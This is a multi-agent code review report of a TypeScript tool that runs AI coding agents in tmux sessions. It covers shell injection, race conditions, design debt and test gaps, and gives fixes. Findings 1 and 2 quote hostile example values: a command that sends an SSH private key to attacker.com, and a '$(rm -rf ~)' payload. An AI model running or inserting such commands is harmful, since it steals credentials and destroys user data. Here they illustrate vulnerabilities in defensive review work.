# Honeybee (`hive`) — Deep Multi-Agent Code Review

Method: 5 parallel review agents covering architecture, correctness/bugs, security, code quality/types, and test coverage. Source: ~1,354 lines across 6 modules in `src/`.

## Critical Findings

### 1. Shell command injection via `tmux new-session`
**`src/tmux.ts:24`** — The `command` argument is passed as a single positional string to `tmux new-session`, which executes it via `/bin/sh -c`. The command is built from `spec.args` which includes user-supplied input. More critically, `HIVE_*_CMD` environment variables (`agents.ts:48`) are treated as trusted shell syntax — a malicious parent process can inject arbitrary commands.

**Attack scenario:** A parent process sets `HIVE_CLAUDE_CMD="claude; curl attacker.com/exfil?$(cat ~/.ssh/id_rsa)"`. The tool trusts this and passes it to tmux for shell execution.

**Fix:** Create an empty tmux session first, then use `execFile` (array form) to launch the agent inside it, avoiding shell interpretation entirely.

### 2. Prompt paste into raw shell when agent fails to start
**`src/tmux.ts:27-31`, `src/cli.ts:216`** — `waitForAgentReady` has a timeout with a fall-through ("Fall through rather than fail"). If the agent crashes, `sendText` pastes the user's prompt verbatim into a bare shell pane, and `sendEnter` executes it. A prompt like `$(rm -rf ~)` would be interpreted as a shell command.

**Fix:** Verify the agent process is actually running in the pane before pasting. Fail hard instead of falling through.

### 3. Non-atomic read-modify-write on `id-index.json`
**`src/ids.ts:27-39`** — Two concurrent `hive spawn` calls can both read the same index, pick UUIDs against the same `used` set, and then one `writeIndex` overwrites the other — losing a UUID registration. Future allocations could collide with the lost ID.

**Fix:** Use a file lock (`proper-lockfile` or `O_EXCL` sentinel) around the read-modify-write cycle.

### 4. Unhandled JSON parse in OpenCode transcript loader
**`src/transcripts.ts:222`** — `JSON.parse` is called without try/catch, unlike every other transcript loader. A malformed session file crashes the entire `hive wait` / `hive transcript` command.

**Fix:** Wrap in try/catch and return `null` on parse failure, consistent with other loaders.

---

## Major Findings

### 5. No agent abstraction — agent logic scattered across 5+ files
**`src/cli.ts:105,160,229-235`, `src/agents.ts:22-31`, `src/transcripts.ts:39-45`** — Agent-specific behavior is raw string comparisons (`record.agent === "droid"`) spread across the codebase. `isAgentReadyPane` is a chain of `if (agent === "claude")` blocks, `hasTranscriptProvider` is a hardcoded list, and `latestTranscript` dispatches via `if/else`. Adding a new agent requires touching 5+ files.

**Fix:** Introduce an `AgentDriver` interface with `readyCheck`, `transcriptReader`, `defaultCommand`, `homeEnvVar` methods.

### 6. `cli.ts` is a god module (510 lines)
Owns argument parsing, command dispatch, all command implementations, session resolution, idle-wait logic, agent readiness detection, and pane heuristics. `waitForIdle` (lines 248-293) is a complex polling loop with transcript scoring, session mutation, and output formatting. `waitForAgentReady` (lines 189-217) contains agent-specific UI automation.

**Fix:** Split into separate modules — extract wait/idle logic, readiness detection, and pure parsing helpers.

### 7. Massive transcript code duplication
**`src/transcripts.ts:47-136`** — `latestClaudeTranscript`, `latestCodexTranscript`, `latestOpenCodeTranscript`, and `latestGrokTranscript` follow the exact same pattern (check shortcut, scan directory, filter by mtime, load/score candidates, return best). Only the root path, file filter, and load function differ. The four `load*Transcript` functions (lines 192-252) also share identical structure.

**Fix:** Parameterized template function or strategy pattern.

### 8. Unsafe `as` casts on untrusted JSON throughout
**`src/store.ts:45,51,74`, `src/transcripts.ts:148,222`** — External JSON is `JSON.parse`'d and immediately cast to expected types with zero runtime validation. Corrupt files produce silent wrong data instead of descriptive errors.

```typescript
return JSON.parse(await readFile(recordPath(name), "utf8")) as SessionRecord;
```

**Fix:** Add lightweight shape guards (`isSessionRecord()`) or use `zod` at parse boundaries.

### 9. Ledger append not concurrency-safe
**`src/store.ts:83`** — `writeFile` with `flag: "a"` is not guaranteed atomic for writes larger than `PIPE_BUF` (~4096 bytes on macOS/Linux). Concurrent `hive` invocations can produce corrupt JSONL lines, especially since `session.save` events include the full `SessionRecord`.

### 10. `sendText` doesn't handle multi-line prompts
**`src/tmux.ts:28-31`** — Text is pasted verbatim via `tmux paste-buffer`, then `sendEnter` is called. Literal newlines in prompt text become separate submitted lines. For agents that process input on Enter, a multi-line prompt is split into unintended partial commands.

### 11. `SessionRecord` is an unbounded bag
**`src/store.ts:1-24`** — 14 optional fields conflate at least three concerns: identity (uuid, prefix, id), lifecycle (status, createdAt), transcript-tracking state (transcriptPath, providerSessionId), and prompt state (lastPrompt, lastPromptAt). `status?: "running" | "dead"` allows undefined, meaning callers cannot trust the field.

### 12. Inconsistent error strategy
**`src/transcripts.ts:222`, `src/store.ts:44-55`** — Some functions use `try/catch` with ENOENT checks, others use `.catch(() => null)`, and the OpenCode reader has bare `JSON.parse` without a catch. Mixed strategies make failure modes unpredictable.

---

## Minor Findings

### 13. Session files lack restrictive permissions
**`src/store.ts:39`** — Session records (containing full commands, `--dangerously-skip-permissions` flags, working dirs) are written with default umask, unlike `id-index.json` which uses `0o600`.

### 14. `tmux` error code confusion
**`src/tmux.ts:14`** — `err.code` is a string in Node (`"ENOENT"`), not the numeric exit code (`err.status`). The condition `typeof err.code === "number"` is almost always false, so the `exitCode` field is always `1`.

### 15. Dead code: no-op flag deletion
**`src/cli.ts:316`** — `if (!spawnParsed.flags.has("name")) spawnParsed.flags.delete("name")` — deletes "name" only when it doesn't exist. No-op.

### 16. Scoring system uses undocumented magic numbers
**`src/transcripts.ts:309-331`** — Weights `+2000`, `+1000`, `+500`, `+200`, `+10` have no documentation. The `+200` cwd bonus is added outside `scoreTranscript` by each caller (lines 214, 229, 249), breaking encapsulation.

### 17. `"latest"` pinned for all devDependencies
**`package.json:20-22`** — Every `npm install` can pull different versions. Builds are non-reproducible.

### 18. `store.ts` module-level constant blocks testability
`const root = process.env.HIVE_STORE_ROOT ?? ...` is evaluated at import time. Tests can't redirect the store path without setting env vars before import — a single test run could corrupt real user data at `~/.hive`.

### 19. `hasTranscriptProvider` duplicates knowledge
**`cli.ts:440`, `transcripts.ts:39`** — Set of agents with transcript providers encoded in two places. Adding a provider to `transcripts.ts` without updating `cli.ts` silently breaks the `hive last` fallback.

### 20. Unbounded ledger growth
**`src/store.ts:83`** — Ledger is append-only with no rotation or size limit. Repeated `hive send` / `hive wait` calls grow `~/.hive/ledger.jsonl` indefinitely.

### 21. Unvalidated `transcriptPath` enables path-traversal reads
**`src/transcripts.ts:48-51`** — Stored `transcriptPath` is re-read without validation. A tampered session record could read arbitrary files (information disclosure).

### 22. `Math.max(0, lines)` in `capture` is a no-op
**`src/tmux.ts:43`** — Always equals `lines` for non-negative inputs. All callers pass positive values. Looks like leftover from a different approach.

### 23. Naming drift between PRD and code
PRD/README use "bee" terminology; internal code uses `agent` (`AgentKind`, `AgentSpec`, `resolveAgent`). `APP_NAME` is "hive" but package is "honeybee".

---

## Test Coverage Audit

| Module | Lines | Tests | Verdict |
|--------|-------|-------|---------|
| `cli.ts` | 510 | **0** | No coverage for parse(), isAgentReadyPane(), waitForIdle, waitForAgentReady |
| `store.ts` | 96 | **0** | No coverage for session CRUD, legacy fallback, safeName |
| `tmux.ts` | 56 | **0** | No coverage |
| `transcripts.ts` | 400 | 1 test | Only Grok path tested; Claude/Codex/OpenCode untested |
| `agents.ts` | 160 | 1 test | **Currently broken** — asserts stale behavior; splitShellWords untested |
| `ids.ts` | 132 | 3 tests | Good quality, proper isolation |

**Most critical untested code:**
- `parse()` — complex flag parsing where bugs break every command
- `isAgentReadyPane()` — regex detection for 7 agents; false positives/negatives cause hangs or premature sends
- `splitShellWords()` — shell quoting parser; bugs here cause wrong commands to be executed
- `scoreTranscript()` — wrong transcript selection = wrong data shown to users

**Testability blockers:**
- `cli.ts` functions aren't exported; can't be unit tested
- `store.ts` evaluates root path at import time
- `ensureDroidYoloSettings` writes to hardcoded `~/.factory/...` path

---

## What's Good

- **Zero runtime dependencies** — excellent supply chain posture
- `ids.ts` tests are well-designed with temp directories and deterministic UUID factories
- Clean module boundaries (despite `cli.ts` being oversized)
- Consistent async/await usage throughout
- Proper file mode (`0o600`) on `id-index.json` and droid settings — just needs extending to other writes

---

## Top 5 Recommended Actions

1. **Fix the shell injection (Finding #1)** — stop passing shell-interpreted strings through `tmux new-session`. Use `execFile` with array args.
2. **Don't fall through on agent-ready timeout (Finding #2)** — fail hard or verify pane contents before sending prompts.
3. **Add file locking** to `id-index.json` and ledger writes (Findings #3, #9).
4. **Extract an `AgentDriver` interface** to consolidate scattered agent-specific logic (Finding #5).
5. **Add tests for `parse()`, `splitShellWords()`, and `isAgentReadyPane()`** — pure logic functions where bugs have outsized impact.
